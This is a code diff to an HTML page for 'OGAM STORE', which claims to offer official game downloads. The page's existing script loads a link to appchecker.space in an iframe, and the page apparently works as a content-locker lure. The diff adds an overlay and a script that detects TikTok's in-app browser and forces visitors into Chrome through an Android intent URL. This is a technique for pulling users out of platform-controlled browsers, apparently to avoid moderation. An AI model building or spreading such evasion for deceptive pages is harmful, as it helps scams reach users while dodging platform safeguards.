@@ -215,6 +215,32 @@ opacity:0.5;
 font-size:12px;
 padding:15px;
 }
+
+/* ===== TIKTOK BROWSER FIX (ADDED ONLY) ===== */
+#ttOverlay{
+position:fixed;
+inset:0;
+background:rgba(0,0,0,.95);
+z-index:999999;
+display:none;
+align-items:center;
+justify-content:center;
+flex-direction:column;
+text-align:center;
+color:#fff;
+padding:20px;
+}
+#ttOverlay h2{margin-bottom:10px}
+#ttOverlay p{opacity:.7;margin-bottom:20px}
+#ttOverlay button{
+padding:12px 18px;
+border:none;
+border-radius:10px;
+background:#3b82f6;
+color:#fff;
+font-weight:800;
+cursor:pointer;
+}
 </style>
 </head>
 
@@ -275,6 +301,7 @@ Official Gaming Store • Secure downloads & verified content<br>
 © 2026 OGAM STORE • All rights reserved
 </footer>
 
+<!-- YOUR SCRIPT (UNCHANGED) -->
 <script>
 
 const link="https://appchecker.space/cl/i/rnnqgv";
@@ -346,6 +373,38 @@ document.getElementById("frame").src=link;
 },25);
 }
 
+/* ===== TIKTOK DETECTION SCRIPT ===== */
+(function () {
+
+  function isTikTok() {
+    return /TikTok|musical_ly/i.test(navigator.userAgent);
+  }
+
+  function openChrome() {
+    const url = window.location.href;
+    const intent = "intent://" + url.replace(/^https?:\/\//,'') +
+      "#Intent;scheme=https;package=com.android.chrome;end;";
+    window.location.href = intent;
+    setTimeout(()=>{window.location.href=url},900);
+  }
+
+  function showOverlay() {
+    const div = document.createElement("div");
+    div.id="ttOverlay";
+    div.innerHTML=`
+      <h2>Open in Browser</h2>
+      <p>For best experience open in Chrome / Safari</p>
+      <button onclick="(${openChrome.toString()})()">Open Now</button>
+    `;
+    document.body.appendChild(div);
+    div.style.display="flex";
+  }
+
+  if(isTikTok()){
+    window.addEventListener("load",showOverlay);
+  }
+
+})();
 </script>
 
 </body>
